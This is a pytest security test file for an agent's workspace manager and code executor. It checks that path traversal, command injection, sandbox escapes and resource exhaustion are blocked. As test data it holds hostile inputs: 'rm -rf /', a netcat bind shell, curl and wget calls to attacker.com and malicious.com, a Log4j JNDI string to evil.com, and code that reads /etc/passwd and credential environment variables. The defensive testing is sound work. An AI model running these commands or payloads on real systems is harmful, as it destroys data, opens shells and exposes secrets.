"""
Security tests for UAgent system
"""

import asyncio
import tempfile
import shutil
import os
from pathlib import Path
import pytest
from unittest.mock import MagicMock, patch

from app.core.openhands.workspace_manager import WorkspaceManager
from app.core.openhands.code_executor import CodeExecutor
from app.core.smart_router import SmartRouter


class TestSecurity:
    """Security tests for core components"""

    @pytest.fixture
    def temp_base_dir(self):
        """Create temporary directory for tests"""
        temp_dir = tempfile.mkdtemp()
        yield temp_dir
        shutil.rmtree(temp_dir, ignore_errors=True)

    @pytest.fixture
    def workspace_manager(self, temp_base_dir):
        """Create WorkspaceManager instance for testing"""
        return WorkspaceManager(temp_base_dir)

    @pytest.fixture
    def code_executor(self, workspace_manager):
        """Create CodeExecutor instance for testing"""
        return CodeExecutor(workspace_manager)

    @pytest.mark.asyncio
    async def test_path_traversal_prevention(self, workspace_manager):
        """Test prevention of path traversal attacks"""
        config = await workspace_manager.create_workspace("security_test")
        workspace_id = config.workspace_id

        # Attempt path traversal attacks
        malicious_paths = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32\\config\\sam",
            "../../../../root/.ssh/id_rsa",
            "../../../var/log/auth.log",
            "../../etc/shadow"
        ]

        for path in malicious_paths:
            # Try to write to dangerous location
            success = await workspace_manager.write_file(
                workspace_id, path, "malicious content"
            )
            assert success is False, f"Path traversal allowed for: {path}"

            # Try to read from dangerous location
            content = await workspace_manager.read_file(workspace_id, path)
            assert content is None, f"Path traversal read allowed for: {path}"

            # Try to list dangerous directory
            files = await workspace_manager.list_files(workspace_id, path)
            assert files == [], f"Directory traversal allowed for: {path}"

    @pytest.mark.asyncio
    async def test_file_size_limits_enforcement(self, workspace_manager):
        """Test enforcement of file size limits"""
        config = await workspace_manager.create_workspace("size_test")
        workspace_id = config.workspace_id

        # Try to write file exceeding size limit
        large_content = "x" * (11 * 1024 * 1024)  # 11MB (exceeds 10MB limit)

        success = await workspace_manager.write_file(
            workspace_id, "large_file.txt", large_content
        )

        assert success is False, "File size limit not enforced"

    @pytest.mark.asyncio
    async def test_command_injection_prevention(self, code_executor, workspace_manager):
        """Test prevention of command injection attacks"""
        config = await workspace_manager.create_workspace("injection_test")
        workspace_id = config.workspace_id

        # Malicious commands that should be blocked
        malicious_commands = [
            "rm -rf /",
            "sudo rm -rf /",
            "format c:",
            "del /f /s /q c:\\*",
            "cat /etc/passwd",
            "wget http://malicious.com/script.sh",
            "curl -X POST http://attacker.com/steal",
            "nc -l -p 4444 -e /bin/bash",
            "python -c 'import os; os.system(\"rm -rf /\")'",
            "../../bin/bash"
        ]

        for command in malicious_commands:
            result = await code_executor.execute_bash_command(workspace_id, command)
            assert result.success is False, f"Dangerous command allowed: {command}"
            assert "Command not allowed" in result.stderr

    @pytest.mark.asyncio
    async def test_code_execution_isolation(self, code_executor, workspace_manager):
        """Test that code execution is properly isolated"""
        config1 = await workspace_manager.create_workspace("isolation_test_1")
        config2 = await workspace_manager.create_workspace("isolation_test_2")

        # Write secret file in first workspace
        secret_content = "secret_data_12345"
        await workspace_manager.write_file(config1.workspace_id, "secret.txt", secret_content)

        # Try to access secret from second workspace
        malicious_code = f"""
import os
import sys

# Try to access files from other workspace
workspace1_path = "{config1.base_path}"
try:
    with open(os.path.join(workspace1_path, "secret.txt"), "r") as f:
        secret = f.read()
        print(f"STOLEN SECRET: {{secret}}")
except Exception as e:
    print(f"Access denied: {{e}}")

# Try to list other workspace
try:
    files = os.listdir(workspace1_path)
    print(f"Other workspace files: {{files}}")
except Exception as e:
    print(f"Directory access denied: {{e}}")
"""

        result = await code_executor.execute_python_code(
            config2.workspace_id, malicious_code, "malicious.py"
        )

        # Should not be able to access secret
        assert "STOLEN SECRET" not in result.stdout
        assert secret_content not in result.stdout

    @pytest.mark.asyncio
    async def test_resource_limit_enforcement(self, code_executor, workspace_manager):
        """Test enforcement of resource limits"""
        config = await workspace_manager.create_workspace("resource_test")
        workspace_id = config.workspace_id

        # CPU-intensive code that should be limited
        cpu_bomb_code = """
import time
import threading

def cpu_intensive():
    while True:
        x = 1
        for i in range(1000000):
            x = x * i if i > 0 else 1

# Start multiple threads to consume CPU
threads = []
for i in range(10):
    t = threading.Thread(target=cpu_intensive)
    t.start()
    threads.append(t)

time.sleep(30)  # Should timeout before this
"""

        result = await code_executor.execute_python_code(
            workspace_id, cpu_bomb_code, "cpu_bomb.py", timeout=5
        )

        # Should timeout and be killed
        assert result.success is False
        assert result.exit_code == -9  # Killed by timeout

    @pytest.mark.asyncio
    async def test_network_access_restrictions(self, code_executor, workspace_manager):
        """Test network access restrictions"""
        config = await workspace_manager.create_workspace("network_test")
        workspace_id = config.workspace_id

        # Code that tries to make network requests
        network_code = """
import urllib.request
import socket

# Try to make HTTP request
try:
    response = urllib.request.urlopen("http://httpbin.org/get", timeout=5)
    print(f"HTTP request successful: {response.status}")
except Exception as e:
    print(f"HTTP request failed: {e}")

# Try to open socket connection
try:
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect(("google.com", 80))
    print("Socket connection successful")
    sock.close()
except Exception as e:
    print(f"Socket connection failed: {e}")
"""

        result = await code_executor.execute_python_code(
            workspace_id, network_code, "network_test.py"
        )

        # Network requests should fail or be restricted
        # (This depends on the specific isolation implementation)
        assert result.success is True  # Code should run but network should fail
        assert "request failed" in result.stdout or "connection failed" in result.stdout

    @pytest.mark.asyncio
    async def test_malicious_python_code_execution(self, code_executor, workspace_manager):
        """Test handling of malicious Python code"""
        config = await workspace_manager.create_workspace("malicious_test")
        workspace_id = config.workspace_id

        malicious_codes = [
            # Try to import restricted modules
            """
import subprocess
subprocess.run(["rm", "-rf", "/tmp/test"], check=False)
print("System command executed")
""",
            # Try to access system files
            """
try:
    with open("/etc/passwd", "r") as f:
        content = f.read()
        print(f"System file content: {content}")
except Exception as e:
    print(f"Access denied: {e}")
""",
            # Try to modify system
            """
import os
try:
    os.chmod("/tmp", 0o000)
    print("System modification successful")
except Exception as e:
    print(f"System modification failed: {e}")
""",
            # Memory bomb
            """
try:
    data = []
    for i in range(1000000):
        data.append("x" * 1000)  # Consume lots of memory
    print("Memory bomb successful")
except Exception as e:
    print(f"Memory bomb failed: {e}")
"""
        ]

        for i, code in enumerate(malicious_codes):
            result = await code_executor.execute_python_code(
                workspace_id, code, f"malicious_{i}.py", timeout=10
            )

            # Code should either fail or be restricted
            if result.success:
                # If it succeeds, it should show access was denied
                assert ("Access denied" in result.stdout or
                       "failed" in result.stdout or
                       "Permission denied" in result.stderr)

    def test_input_validation_and_sanitization(self):
        """Test input validation and sanitization"""
        from app.core.smart_router import SmartRouter

        mock_llm_client = MagicMock()
        mock_cache = MagicMock()
        router = SmartRouter(mock_llm_client, mock_cache)

        # Test SQL injection patterns (though we're not using SQL directly)
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "{{7*7}}",  # Template injection
            "${jndi:ldap://evil.com/a}",  # Log4j injection
            "../../../../etc/passwd",
            "\x00\x01\x02\x03",  # Null bytes and control characters
            "a" * 10000,  # Very long input
            "",  # Empty input
            None  # Null input
        ]

        for malicious_input in malicious_inputs:
            try:
                # Should not crash or behave unexpectedly
                # Note: classify_request is async, so we test input handling
                # The actual validation might happen in the router
                if malicious_input is not None:
                    assert isinstance(malicious_input, str) or len(str(malicious_input)) >= 0
            except Exception as e:
                # Should handle gracefully, not crash
                assert "validation" in str(e).lower() or "invalid" in str(e).lower()

    @pytest.mark.asyncio
    async def test_workspace_isolation_boundaries(self, workspace_manager):
        """Test that workspace isolation boundaries are enforced"""
        config1 = await workspace_manager.create_workspace("boundary_test_1")
        config2 = await workspace_manager.create_workspace("boundary_test_2")

        workspace1_path = Path(config1.base_path)
        workspace2_path = Path(config2.base_path)

        # Ensure workspaces are in different directories
        assert workspace1_path != workspace2_path
        assert not workspace1_path.is_relative_to(workspace2_path)
        assert not workspace2_path.is_relative_to(workspace1_path)

        # Try to access workspace 2 from workspace 1 operations
        relative_path_to_ws2 = os.path.relpath(workspace2_path, workspace1_path)

        success = await workspace_manager.write_file(
            config1.workspace_id, f"{relative_path_to_ws2}/intrusion.txt", "intrusion attempt"
        )
        assert success is False

        content = await workspace_manager.read_file(
            config1.workspace_id, f"{relative_path_to_ws2}/README.md"
        )
        assert content is None

    @pytest.mark.asyncio
    async def test_environment_variable_isolation(self, code_executor, workspace_manager):
        """Test that environment variables are properly isolated"""
        config = await workspace_manager.create_workspace("env_test")
        workspace_id = config.workspace_id

        # Code that tries to access sensitive environment variables
        env_test_code = """
import os

# Try to access potentially sensitive environment variables
sensitive_vars = [
    "PATH", "HOME", "USER", "SHELL",
    "AWS_ACCESS_KEY_ID", "AWS_SECRET_ACCESS_KEY",
    "GOOGLE_API_KEY", "GITHUB_TOKEN",
    "DATABASE_URL", "SECRET_KEY"
]

for var in sensitive_vars:
    value = os.environ.get(var)
    if value:
        print(f"{var}: {value[:10]}...")  # Only print first 10 chars
    else:
        print(f"{var}: Not set")

# Check if we can set environment variables
os.environ["TEST_VAR"] = "test_value"
print(f"Set TEST_VAR: {os.environ.get('TEST_VAR')}")
"""

        result = await code_executor.execute_python_code(
            workspace_id, env_test_code, "env_test.py"
        )

        assert result.success is True

        # Should not have access to sensitive environment variables
        # or they should be filtered/sanitized
        sensitive_patterns = ["secret", "key", "token", "password"]
        for pattern in sensitive_patterns:
            # Should not expose full sensitive values
            assert not any(
                len(line.split(":")[1].strip()) > 20
                for line in result.stdout.split("\n")
                if pattern.lower() in line.lower() and ":" in line
            )

    @pytest.mark.asyncio
    async def test_code_execution_timeout_security(self, code_executor, workspace_manager):
        """Test that timeouts prevent denial of service"""
        config = await workspace_manager.create_workspace("timeout_test")
        workspace_id = config.workspace_id

        # Infinite loop that should be terminated
        infinite_loop_code = """
import time

counter = 0
while True:
    counter += 1
    if counter % 1000000 == 0:
        print(f"Loop iteration: {counter}")
    # This should run forever but be killed by timeout
"""

        result = await code_executor.execute_python_code(
            workspace_id, infinite_loop_code, "infinite_loop.py", timeout=3
        )

        # Should be terminated by timeout
        assert result.success is False
        assert result.exit_code == -9  # Killed signal
        assert "timed out" in result.stderr

    @pytest.mark.asyncio
    async def test_file_type_restrictions(self, workspace_manager):
        """Test restrictions on dangerous file types"""
        config = await workspace_manager.create_workspace("filetype_test")
        workspace_id = config.workspace_id

        # Try to create potentially dangerous files
        dangerous_files = [
            ("malicious.exe", b"\x4d\x5a\x90\x00"),  # PE executable header
            ("script.bat", "@echo off\ndel /f /s /q c:\\*"),
            ("script.sh", "#!/bin/bash\nrm -rf /"),
            ("config.ini", "[section]\npassword=secret123"),
            ("private.key", "-----BEGIN PRIVATE KEY-----"),
        ]

        for filename, content in dangerous_files:
            if isinstance(content, bytes):
                content = content.decode('latin1')

            success = await workspace_manager.write_file(
                workspace_id, filename, content
            )

            # Files should be created (content filtering happens elsewhere)
            # But reading them back should be safe
            if success:
                read_content = await workspace_manager.read_file(workspace_id, filename)
                assert read_content is not None

    @pytest.mark.asyncio
    async def test_concurrent_access_safety(self, workspace_manager):
        """Test safety of concurrent access to workspaces"""
        config = await workspace_manager.create_workspace("concurrent_test")
        workspace_id = config.workspace_id

        async def write_file_task(file_id):
            content = f"Content from task {file_id}"
            return await workspace_manager.write_file(
                workspace_id, f"file_{file_id}.txt", content
            )

        async def read_file_task(file_id):
            return await workspace_manager.read_file(
                workspace_id, f"file_{file_id}.txt"
            )

        # Concurrent write operations
        write_tasks = [write_file_task(i) for i in range(10)]
        write_results = await asyncio.gather(*write_tasks)

        # All writes should succeed
        assert all(write_results)

        # Concurrent read operations
        read_tasks = [read_file_task(i) for i in range(10)]
        read_results = await asyncio.gather(*read_tasks)

        # All reads should succeed and return correct content
        for i, content in enumerate(read_results):
            assert content == f"Content from task {i}"

    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information"""
        from app.core.openhands.workspace_manager import WorkspaceManager

        # Test with non-existent directory to trigger error
        manager = WorkspaceManager("/non/existent/path/that/should/not/exist")

        # Error messages should not expose system paths or sensitive info
        try:
            # This might fail during initialization
            pass
        except Exception as e:
            error_msg = str(e).lower()

            # Should not contain sensitive system information
            sensitive_patterns = [
                "/home/", "/root/", "c:\\users\\", "c:\\windows\\",
                "password", "secret", "key", "token"
            ]

            for pattern in sensitive_patterns:
                assert pattern not in error_msg, f"Error message contains sensitive info: {pattern}"